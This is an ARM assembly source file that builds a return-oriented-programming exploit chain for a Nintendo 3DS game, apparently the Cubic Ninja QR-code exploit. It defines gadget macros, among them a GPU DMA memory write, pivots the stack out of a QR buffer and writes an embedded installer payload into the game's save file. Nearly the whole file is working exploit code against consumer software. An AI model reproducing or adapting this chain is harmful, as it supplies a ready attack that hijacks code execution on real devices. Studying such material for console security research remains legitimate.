.nds

.include "../build/constants.s"

.open "sploit_proto.bin","cn_qr_installer.bin",0x0

.arm

CN_SAVEARCHIVE_HANDLE equ (CN_TMPVAR_ADR + 0x10)
CN_SAVEFILE_HANDLE equ (CN_TMPVAR_ADR + 0x20)
CN_DUMMYPTR equ (CN_TMPVAR_ADR + 0x30)

CN_SAVEFILE_PATH equ (CN_SECONDARYROP_DST + savefile_path)
CN_SAVEFILE_PATH_SIZE equ (savefile_path_end - savefile_path)

CN_INSTALLERDATA_PTR equ (CN_SECONDARYROP_DST + installerdata)
CN_INSTALLERDATA_SIZE equ (installerdata_end - installerdata)

.include "data.s"

.macro set_lr,_lr
	.word ROP_CN_POP_R3PC ; pop {r3, pc}
		.word ROP_CN_POP_PC ; r3
	.word ROP_CN_POP_R4LR_BX_R3 ; pop {r4, lr} | bx r3
		.word 0xDEADBABE ; r4 (garbage)
		.word _lr ; lr
.endmacro

; dst_label has to be a file-address-soace address
.macro jump_sp,dst_label
	.word ROP_CN_POP_R3_ADD_SPR3_POP_PC
		.word dst_label - @@pivot_loc ; r3
	@@pivot_loc:
.endmacro

.macro ldr_r0,addr
	.word ROP_CN_POP_R0PC
		.word addr
	.word ROP_CN_LDR_R0R0_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro str_r0,addr
	.word ROP_CN_POP_R4PC
		.word addr
	.word ROP_CN_STR_R0R4_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro str_val,addr,val
	.word ROP_CN_POP_R0PC
		.word val
	str_r0 addr
.endmacro

.macro ldr_add_r0,addr,addval
	.word ROP_CN_POP_R0PC
		.word addr
	.word ROP_CN_LDR_R0R0_POP_R4PC
		.word addval ; r4
	.word ROP_CN_ADD_R0R4_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro cmp_derefptr_constaddr,addr,const
	ldr_add_r0 addr, 0x100000000 - const
	.word ROP_CN_CMP_R0x0_MVNNE_R0x0_MOVEQ_R0R4_POP_R4R5R6PC
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
.endmacro

.macro cmp_derefptr_r0addr,const,condr0
	.word ROP_CN_LDR_R0R0_POP_R4PC
		.word 0x100000000 - const
	.word ROP_CN_ADD_R0R4_POP_R4PC
		.word condr0 ; r4 (new value for r0 if [r0] == const)
	.word ROP_CN_CMP_R0x0_MVNNE_R0x0_MOVEQ_R0R4_POP_R4R5R6PC
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
.endmacro

.macro gspwn,dst,src,size
	set_lr ROP_CN_POP_R4R5R6R7R8R9R10R11PC
	.word ROP_CN_POP_R0PC ; pop {r0, pc}
		.word CN_GSPGPU_INTERRUPT_RECEIVER_STRUCT + 0x58 ; r0 (nn__gxlow__CTR__detail__GetInterruptReceiver)
	.word ROP_CN_POP_R1PC ; pop {r1, pc}
		.word CN_SECONDARYROP_DST + @@gxCommandPayload ; r1 (cmd addr)
	.word CN_GSPGPU_GXTRYENQUEUE
		@@gxCommandPayload:
		.word 0x00000004 ; command header (SetTextureCopy)
		.word src ; source address
		.word dst ; destination address (standin, will be filled in)
		.word size ; size
		.word 0x00000000 ; dim in
		.word 0x00000000 ; dim out
		.word 0x00000008 ; flags
		.word 0x00000000 ; unused
.endmacro

.macro gspwn_dstderefadd,dst_base,dst_offset_ptr,src,size,offset
	ldr_add_r0 dst_offset_ptr, dst_base 
	str_r0 @@gxCommandPayload + 0x8 + offset
	set_lr ROP_CN_POP_R4R5R6R7R8R9R10R11PC
	.word ROP_CN_POP_R0PC ; pop {r0, pc}
		.word CN_GSPGPU_INTERRUPT_RECEIVER_STRUCT + 0x58 ; r0 (nn__gxlow__CTR__detail__GetInterruptReceiver)
	.word ROP_CN_POP_R1PC ; pop {r1, pc}
		.word CN_SECONDARYROP_DST + @@gxCommandPayload ; r1 (cmd addr)
	.word CN_GSPGPU_GXTRYENQUEUE
		@@gxCommandPayload:
		.word 0x00000004 ; command header (SetTextureCopy)
		.word src ; source address
		.word 0xDEADBABE ; destination address (standin, will be filled in)
		.word size ; size
		.word 0xFFFFFFFF ; dim in
		.word 0xFFFFFFFF ; dim out
		.word 0x00000008 ; flags
		.word 0x00000000 ; unused
.endmacro

.macro flush_dcache,addr,size
	set_lr ROP_CN_NOP
	.word ROP_CN_POP_R0PC ; pop {r0, pc}
		.word CN_GSPHANDLE_ADR ; r0 (handle ptr)
	.word ROP_CN_POP_R1PC ; pop {r1, pc}
		.word 0xFFFF8001 ; r1 (process handle)
	.word ROP_CN_POP_R2R3R4PC ; pop {r2, r3, r4, pc}
		.word addr ; r2 (addr)
		.word size ; r3 (src)
		.word 0xDEADBABE ; r4 (garbage)
	.word CN_GSPGPU_FlushDataCache_ADR
.endmacro

.macro memcpy,dst,src,size
	set_lr ROP_CN_NOP
	.word ROP_CN_POP_R0PC ; pop {r0, pc}
		.word dst ; r0
	.word ROP_CN_POP_R1PC ; pop {r1, pc}
		.word src ; r1
	.word ROP_CN_POP_R2R3R4PC ; pop {r2, r3, r4, pc}
		.word size ; r2 (addr)
		.word 0xDEADBABE ; r3 (garbage)
		.word 0xDEADBABE ; r4 (garbage)
	.word CN_MEMCPY
.endmacro

.macro sleep,nanosec_low,nanosec_high
	set_lr ROP_CN_NOP
	.word ROP_CN_POP_R0PC ; pop {r0, pc}
		.word nanosec_low ; r0
	.word ROP_CN_POP_R1PC ; pop {r1, pc}
		.word nanosec_high ; r1
	.word CN_SLEEP
.endmacro

.macro fsuOpenFileDirectly,outhandle,archive_id,archive_path_type,archive_path_data,archive_path_size,file_path_type,file_path_data,file_path_size,open_flags
	set_lr ROP_CN_POP_R4R5R6R7R8R9R10R11PC
	.word ROP_CN_POP_R0PC ; pop {r0, pc}
		.word CN_FSHANDLE_ADR ; R0 : &fsuHandle
	.word ROP_CN_POP_R1PC ; pop {r1, pc}
		.word outhandle ; R1 : &outhandle
	.word ROP_CN_POP_R2R3R4PC ; pop {r2, r3, r4, pc}
		.word 0x00000000 ; R2 : transaction
		.word archive_id ; R3 : archive id
		.word 0xDEADBABE ; r4 (garbage)
	.word CN_FSOPENFILEDIRECTLY
		.word archive_path_type ; archive path type
		.word archive_path_data ; Archive Path Data Pointer
		.word archive_path_size ; archive path size
		.word file_path_type ; File Path Type
		.word file_path_data ; File Path Data Pointer
		.word file_path_size ; File Path Size
		.word open_flags ; Open Flags
		.word 0xDEADBABE ; r11 (garbage)
.endmacro

.macro mov_u32,dst,src
	.word ROP_CN_POP_R0PC ; pop {r0, pc}
		.word src
	.word ROP_CN_LDR_R0R0_POP_R4PC
		.word dst ; r4
	.word ROP_CN_STR_R0R4_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro mov_u64,dst,src
	mov_u32 dst, src
	mov_u32 dst+4, src+4
.endmacro

.macro fsuOpenFile,outhandle,archive_handle_ptr,file_path_type,file_path_data,file_path_size,open_flags,attributes
	mov_u64 CN_SECONDARYROP_DST + @@archive_param, archive_handle_ptr
	set_lr ROP_CN_POP_R4R5R6R7R8R9R10R11PC
	.word ROP_CN_POP_R0PC ; pop {r0, pc}
		.word CN_FSHANDLE_ADR ; R0 : &fsuHandle
	.word ROP_CN_POP_R1PC ; pop {r1, pc}
		.word outhandle ; R1 : &outhandle
	.word ROP_CN_POP_R2R3R4PC ; pop {r2, r3, r4, pc}
		.word 0x00000000 ; R2 : transaction
		.word 0xDEADBABE ; R3 : garbage
		.word 0xDEADBABE ; r4 (garbage)
	.word CN_FSOPENFILE
	@@archive_param:
		.word 0xDEADBABE
		.word 0xDEADBABE
		.word file_path_type ; File Path Type
		.word file_path_data ; File Path Data Pointer
		.word file_path_size ; File Path Size
		.word open_flags ; Open Flags
		.word attributes ; Attributes
		.word 0xDEADBABE ; r11 (garbage)
.endmacro

.macro fsuWriteFile,filehandle,byteswritten,offset_low,offset_high,dataptr,size
	set_lr ROP_CN_POP_R2R3R4PC
	.word ROP_CN_POP_R0PC ; pop {r0, pc}
		.word filehandle ; R0 : &filehandle
	.word ROP_CN_POP_R1PC ; pop {r1, pc}
		.word byteswritten ; R1 : &byteswritten
	.word ROP_CN_POP_R2R3R4PC ; pop {r2, r3, r4, pc}
		.word offset_low ; R2 : offset low
		.word offset_high ; R3 : offset high
		.word 0xDEADBABE ; r4 (garbage)
	.word CN_FSFILEWRITE
		.word dataptr ; data ptr
		.word size ; size
		.word 0x1 ; write options (flush ?)
.endmacro

.macro fsuCloseFile,filehandle
	set_lr ROP_CN_NOP
	.word ROP_CN_POP_R0PC ; pop {r0, pc}
		.word filehandle ; R0 : &filehandle
	.word CN_FSFILECLOSE
.endmacro

.macro fsuOpenArchive,fsuHandle,outhandle,archive_id,archive_path_type,archive_path_data,archive_path_size
	set_lr ROP_CN_POP_R2R3R4PC
	.word ROP_CN_POP_R0PC ; pop {r0, pc}
		.word fsuHandle ; R0 : fsu handle
	.word ROP_CN_POP_R1PC ; pop {r1, pc}
		.word outhandle ; R1 : outhandle
	.word ROP_CN_POP_R2R3R4PC ; pop {r2, r3, r4, pc}
		.word archive_id ; R2 : archive id
		.word archive_path_type ; R3 : path type
		.word 0xDEADBABE ; r4 (garbage)
	.word CN_FSOPENARCHIVE
		.word archive_path_data ; Path Data Pointer
		.word archive_path_size ; Path Size
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro fsuControlArchive,fsuHandle,archive_handle_ptr,action,input_ptr,input_size,output_ptr,output_size
	mov_u64 CN_SECONDARYROP_DST + @@archive_param, archive_handle_ptr
	set_lr ROP_CN_POP_R4R5R6R7R8R9R10R11PC
	.word ROP_CN_POP_R0PC ; pop {r0, pc}
		.word fsuHandle ; R0 : fsu handle
	.word ROP_CN_POP_R1PC ; pop {r1, pc}
		.word 0xDEADBABE ; R1 : garbage
	.word ROP_CN_POP_R2R3R4PC ; pop {r2, r3, r4, pc}
		@@archive_param:
		.word 0xDEADBABE ; R2
		.word 0xDEADBABE ; R3
		.word 0xDEADBABE ; r4 (garbage)
	.word CN_FSCONROLARCHIVE
		.word action ; action
		.word input_ptr ; input
		.word input_size ; input size
		.word output_ptr ; output
		.word output_size ; output size
		.word 0xDEADBABE ; r9 (garbage)
		.word 0xDEADBABE ; r10 (garbage)
		.word 0xDEADBABE ; r11 (garbage)
.endmacro

;length
.orga 0x60
	.word endROP-ROP+0xA8-0x64

;ROP
.orga 0xA8
ROP:
	;jump to safer place
		
		.word ROP_CN_POP_R0PC ; pop	{r0, pc}
			.word CN_QRBUFPTR ; r0 
		.word ROP_CN_LDR_R0R0_POP_R4PC ; ldr r0, [r0] | pop {r4, pc}
			.word 0x00000008 ; r4
		.word ROP_CN_ADD_R0R4_POP_R4PC ; add r0, r0, r4 | pop {r4, pc}
			.word 0xDEADC0DE ; r4 (garbage)
		.word ROP_CN_LDR_R0R0_POP_R4PC ; ldr r0, [r0] | pop {r4, pc}
			.word CN_TMPVAR_ADR ; r4 (tmp var adr)
		.word ROP_CN_STR_R0R4_POP_R4PC ; str r0, [r4] | pop {r4, pc}
			.word CN_STACKPAYLOADADR+filePayloadOffset-ROP ; r4 (dst)
		.word ROP_CN_STR_R0R4_POP_R4PC ; str r0, [r4] | pop {r4, pc}
			.word 0xDEADC0DE ; r4 (garbage)

		; perform memcpy 
		set_lr ROP_CN_POP_PC
		.word ROP_CN_POP_R0PC
			.word CN_SECONDARYROP_DST
		.word ROP_CN_POP_R1PC
		filePayloadOffset:
			.word 0xDEADC0DE ; r1 (garbage because gets overwritten by previous rop stff)
		.word ROP_CN_POP_R2R3R4PC
			.word secondaryROP_end ; r2 (size)
			.word 0xDEADBABE ; r3 (garbage)
			.word 0xDEADBABE ; r4 (garbage)
		.word CN_MEMCPY

		; jump to new rop buffer
		.word ROP_CN_POP_R3_ADD_SPR3_POP_PC
			.word CN_SECONDARYROP_DST - (CN_STACKPAYLOADADR - 0xA8)
endROP:

secondaryROP:

	fsuOpenArchive CN_FSHANDLE_ADR, CN_SAVEARCHIVE_HANDLE, 0x00000004, 1, 0, 0
	fsuOpenFile CN_SAVEFILE_HANDLE, CN_SAVEARCHIVE_HANDLE, 3, CN_SAVEFILE_PATH, CN_SAVEFILE_PATH_SIZE, CN_QRINSTALLER_MODE, 0
	fsuWriteFile CN_SAVEFILE_HANDLE, CN_DUMMYPTR, CN_QRINSTALLER_OFFSET, 0, CN_INSTALLERDATA_PTR, CN_INSTALLERDATA_SIZE
	fsuCloseFile CN_SAVEFILE_HANDLE
	fsuControlArchive CN_FSHANDLE_ADR, CN_SAVEARCHIVE_HANDLE, 0, 0, 0, 0, 0
	; sleep 0xFFFFFFFF, 0x0FFFFFFF
	; todo : exit to home menu rather than crash ?
	.word 0xdeaddead

savefile_path:
	.ascii CN_QRINSTALLER_PATH
	.byte 0x00
savefile_path_end:

installerdata:
	.incbin "data.bin"
installerdata_end:

secondaryROP_end:

.Close
